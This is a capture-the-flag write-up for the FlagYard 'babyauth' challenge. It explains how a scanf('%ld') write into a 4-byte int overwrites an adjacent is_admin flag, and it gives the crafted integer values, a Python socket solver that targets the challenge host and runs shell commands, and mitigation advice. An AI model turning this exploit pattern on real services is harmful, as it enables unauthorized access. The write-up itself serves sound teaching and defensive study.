---
title: "FlagYard babyauth — Writeup"
date: 2025-11-11
categories:
  - FlagYard
tags:
  - pwn
  - memory-corruption
  - stack
  - reverse-engineering
---

# FlagYard babyauth — Writeup

Compact writeup for a beginner auth bypass via a type-size mismatch that corrupts a neighboring stack variable.

## Summary

The binary asks for a numeric `length`, allocates a buffer, reads a `password`, and compares it to the environment variable `SECRET`. If it matches, it sets `is_admin = 1` and spawns a shell. A bug in `getval` passes an `int *` to `scanf("%ld")` by casting: `getval("length: ", (long*)&len);` causing `scanf` to write 8 bytes (size of `long` on x86_64) into a 4‑byte slot. This overwrites the adjacent `is_admin` variable. We can force `is_admin = 1` without knowing `SECRET`.

## Vulnerability

Stack locals (typical layout):
```
int is_admin = 0;
int len;
getval("length: ", (long*)&len); // scanf("%ld") writes 8 bytes at &len
```
Memory write covers `len` (first 4 bytes) + `is_admin` (next or previous 4 depending on ordering). Supplying a crafted 64‑bit integer sets `is_admin=1`.

Primary pattern (if layout is [len][is_admin]):
```
value = (1 << 32) | desired_len
example desired_len = 32  -> 4294967328
```
Alternate pattern (if layout reversed):
```
value = (desired_len << 32) | 1
example desired_len = 32  -> 137438953473
```

## Exploitation

1. Connect to service.
2. At `length:` prompt send crafted 64‑bit decimal.
3. At `password:` prompt send any string (check now bypassed).
4. Receive `[+] Authenticated` and interact with shell.

## Socket Solver

```python
#!/usr/bin/env python3
import socket, time

HOST = "34.252.33.37"
PORT = 31886

PRIMARY = (1 << 32) | 32        # 4294967328
ALT     = (32 << 32) | 1        # 137438953473

def attempt(val):
    print(f"[+] Trying {val}")
    s = socket.create_connection((HOST, PORT))
    s.recv(1024)                # "length: "
    s.sendall(str(val).encode() + b"\n")
    s.recv(1024)                # "password: "
    s.sendall(b"A\n")
    out = s.recv(1024)
    print(out.decode(errors="ignore").strip())
    if b"Authenticated" in out:
        s.sendall(b"id\n"); time.sleep(0.2)
        print(s.recv(4096).decode(errors="ignore"))
        # Example flag retrieval (adjust path as needed):
        # s.sendall(b"cat flag.txt\n"); time.sleep(0.2); print(s.recv(4096).decode(errors="ignore"))
        return True
    s.close()
    return False

if __name__ == "__main__":
    if not attempt(PRIMARY):
        attempt(ALT)
```

## Result

After successful overwrite you get a shell; read the challenge flag from the expected location (e.g. `cat flag.txt`).

## Mitigation

- Match format specifiers to variable types: use `scanf("%d", &len)` or declare `len` as `long`.
- Compile with warnings (`-Wall -Wextra -Wformat`).
- Consider stack variable reordering or adding SSP/canaries (already present but not relevant here).

## Takeaway

A single unsafe cast turns a straightforward auth check into a trivial privilege bypass. Always heed compiler warnings about format and type mismatches.

---
